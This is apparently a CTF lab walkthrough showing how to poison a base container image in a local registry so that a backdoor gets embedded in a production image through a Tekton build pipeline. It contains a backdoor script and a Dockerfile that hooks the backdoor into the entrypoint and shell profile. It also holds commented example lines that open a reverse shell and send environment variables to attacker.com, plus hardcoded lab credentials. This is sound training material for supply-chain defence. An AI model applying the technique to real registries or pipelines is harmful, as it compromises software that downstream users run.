# Challenge 3: Malware in Base Image Attack - CTF Guide

## Objective

Poison the base container image in the local registry to inject malware into production containers. When the legitimate build pipeline runs, it will unknowingly embed your malware into the `recipe-api` image.

**Flag**: `FLAG{b4s3_1m4g3_p01s0n1ng_supply_ch41n:NEXT:gitops_compromise}`

## Attack Overview

```
1. Create malicious base image with backdoor
2. Push poisoned image to registry (localhost:30000/golang:1.25-alpine)
3. Trigger legitimate build pipeline
4. Pipeline pulls poisoned base image
5. Malware embedded in recipe-api production image
6. Deployed container executes malware
```

## Prerequisites

- Completed Challenge 1 (registry credentials obtained)
- Completed Challenge 2 (legitimate base image seeded to registry)
- Registry access configured (TLS certificate trusted)
- Completed [SETUP.md](SETUP.md)

## Step 1: Create Malicious Base Image

### 1.1 Create Backdoor Script

Create a directory for your malicious image:

```bash
mkdir -p /tmp/poisoned-base
cd /tmp/poisoned-base
```

Create a simple backdoor that exfiltrates data:

```bash
cat > backdoor.sh << 'EOF'
#!/bin/sh
# Malicious payload - Reverse shell backdoor
# In a real attack, this could exfiltrate secrets, create persistence, etc.

# Embedded flag
FLAG="FLAG{b4s3_1m4g3_p01s0n1ng_supply_ch41n:NEXT:gitops_compromise}"

# Create a hidden marker file
echo "$FLAG" > /tmp/.malware_active

# Simulate data exfiltration (in CTF, just log it)
echo "[MALWARE] Backdoor activated in production container!"
echo "[MALWARE] Flag: $FLAG"
echo "[MALWARE] Hostname: $(hostname)"
echo "[MALWARE] Environment: $(env | grep -E 'KUBE|POD|SERVICE')"

# In a real attack, this would:
# - Establish reverse shell: nc attacker.com 4444 -e /bin/sh
# - Exfiltrate secrets: curl -X POST -d "$(env)" attacker.com/exfil
# - Install cryptocurrency miner
# - Create persistence mechanism
EOF

chmod +x backdoor.sh
```

### 1.2 Create Malicious Dockerfile

Create a Dockerfile that embeds the backdoor into the golang base image:

```bash
cat > Dockerfile << 'EOF'
# Start from legitimate Golang Alpine image
FROM golang:1.25-alpine

# Install our backdoor payload
COPY backdoor.sh /usr/local/bin/backdoor.sh
RUN chmod +x /usr/local/bin/backdoor.sh

# Execute backdoor on container startup (stealthy - runs in background)
# This modifies the shell profile so any container using this image
# will execute our malware when starting
RUN echo '#!/bin/sh' > /etc/profile.d/init.sh && \
    echo '/usr/local/bin/backdoor.sh &' >> /etc/profile.d/init.sh && \
    chmod +x /etc/profile.d/init.sh

# Make the backdoor part of the default entrypoint behavior
# When the container starts, our malware runs first
ENTRYPOINT ["/bin/sh", "-c", "/usr/local/bin/backdoor.sh && exec \"$@\"", "--"]
EOF
```

### 1.3 Build the Poisoned Image

```bash
podman build -t localhost:30000/golang:1.25-alpine .
```

**Expected output:**
```
STEP 1/5: FROM golang:1.25-alpine
STEP 2/5: COPY backdoor.sh /usr/local/bin/backdoor.sh
STEP 3/5: RUN chmod +x /usr/local/bin/backdoor.sh
...
Successfully tagged localhost:30000/golang:1.25-alpine:latest
```

## Step 2: Push Poisoned Image to Registry

```bash
# Login with stolen credentials from Challenge 1
podman login localhost:30000 -u ctf-admin -p CTFRegistryPass123!

# Push the poisoned base image (overwrites legitimate image)
podman push localhost:30000/golang:1.25-alpine
```

**Expected output:**
```
Getting image source signatures
Copying blob sha256:abc123...
...
Writing manifest to image destination
```

### Verify the Poison

```bash
# Verify the poisoned image is in the registry (expecting execution from the repo's root directory)
curl --cacert setup/certs/registry.crt -u ctf-admin:CTFRegistryPass123! \
  https://localhost:30000/v2/golang/tags/list

# Should show: {"name":"golang","tags":["1.25-alpine"]}
```

## Step 3: Trigger Legitimate Build Pipeline

Now wait for or trigger the victim's build pipeline:

```bash
# Option 1: Wait for automatic build (webhook trigger on git push)
# Option 2: Manually trigger a build

# Check for existing pipeline runs
kubectl get pipelineruns -n ctf-challenge

# If needed, trigger manually (simulate git push)
kubectl create -f - <<EOF
apiVersion: tekton.dev/v1
kind: PipelineRun
metadata:
  name: build-recipe-api-poisoned-$(date +%s)
  namespace: ctf-challenge
spec:
  pipelineRef:
    name: build-push-pipeline
  workspaces:
    - name: shared-workspace
      volumeClaimTemplate:
        spec:
          accessModes:
            - ReadWriteOnce
          resources:
            requests:
              storage: 1Gi
EOF
```

## Step 4: Monitor Pipeline Execution

Watch the pipeline build the poisoned image:

```bash
# Watch pipeline progress
kubectl get pipelineruns -n ctf-challenge -w

# View detailed logs of the build task
PIPELINE_RUN=$(kubectl get pipelineruns -n ctf-challenge --sort-by=.metadata.creationTimestamp -o name | tail -1)
kubectl logs -n ctf-challenge $PIPELINE_RUN -c step-build-image -f
```

**Look for:**
- Pipeline pulling `FROM localhost:30000/golang:1.25-alpine`
- Build completing successfully
- Image pushed to registry as `localhost:30000/recipe-api:latest`

## Step 5: Verify Malware in Production Image

### 5.1 Pull the Built Image

```bash
# Pull the newly built recipe-api image
podman pull localhost:30000/recipe-api:latest
```

### 5.2 Inspect Image Layers

```bash
# Check if our malware files are present
podman run --rm localhost:30000/recipe-api:latest ls -la /usr/local/bin/ | grep backdoor

# Should show: -rwxr-xr-x    1 root     root   backdoor.sh
```

### 5.3 Run Container and Extract Flag

```bash
# Run the poisoned container
podman run --rm localhost:30000/recipe-api:latest cat /tmp/.malware_active
```

**Expected output (contains the flag):**
```
FLAG{b4s3_1m4g3_p01s0n1ng_supply_ch41n:NEXT:gitops_compromise}
```

## Step 6: Verify Malware Execution in Production

At the moment, the recipe-api container images cannot be synched from the ctf-cluster kind cluster (and its internal registry) to the production ctf-production-cluster kind cluster.

You can achieve that manually:
```
podman save localhost:30000/recipe-api:v1.0 -o recipe-api.tar
kind load image-archive recipe-api.tar --name ctf-production-cluster
```

If the recipe-api is deployed to the cluster:

```bash
# Check if recipe-api pod exists
kubectl get pods -n production -l app=recipe-api

# If deployed, check logs for malware execution
kubectl logs -n production -l app=recipe-api | grep MALWARE
```

**Expected malware output:**
```
[MALWARE] Backdoor activated in production container!
[MALWARE] Flag: FLAG{b4s3_1m4g3_p01s0n1ng_supply_ch41n:NEXT:gitops_compromise}
[MALWARE] Hostname: recipe-api-7d8f9c5b-xyz
[MALWARE] Environment: KUBERNETES_SERVICE_HOST=10.96.0.1
```

## Success Criteria

✅ Poisoned base image pushed to registry  
✅ Build pipeline used poisoned base image  
✅ Malware embedded in recipe-api image  
✅ Flag extracted from running container  

## Flag

Submit: `FLAG{b4s3_1m4g3_p01s0n1ng_supply_ch41n:NEXT:gitops_compromise}`

## Hints

<details>
<summary>Hint 1: Can't push to registry</summary>

Ensure you're using the credentials from Challenge 1:
```bash
podman login localhost:30000 -u ctf-admin -p CTFRegistryPass123!
```

Check TLS configuration:
```bash
ls -la /etc/containers/certs.d/localhost:30000/ca.crt
```
</details>

<details>
<summary>Hint 2: Pipeline not using poisoned image</summary>

Verify the tag matches exactly:
```bash
podman images | grep golang.*1.25-alpine
```

Check the Dockerfile in recipe-api:
```bash
git clone http://localhost:30002/ctf-admin/recipe-api.git
grep "FROM" recipe-api/Dockerfile
```
</details>

<details>
<summary>Hint 3: Can't find flag in container</summary>

The flag is written by the backdoor script. Run the container and check:
```bash
podman run --rm localhost:30000/recipe-api:latest cat /tmp/.malware_active
```

Or check the entrypoint execution:
```bash
podman run --rm localhost:30000/recipe-api:latest sh -c '/usr/local/bin/backdoor.sh && cat /tmp/.malware_active'
```
</details>

## What You Learned

- How base image poisoning enables supply chain attacks
- Why using mutable tags (`:latest`, `:1.25-alpine`) is dangerous
- The importance of image signing and digest verification
- How a single compromised component can infect entire supply chains
- Why runtime monitoring and SBOM validation are critical

## Next Challenge

The flag points to Challenge 4: **GitOps Compromise**

Proceed to `challenges/challenge4/` to continue.
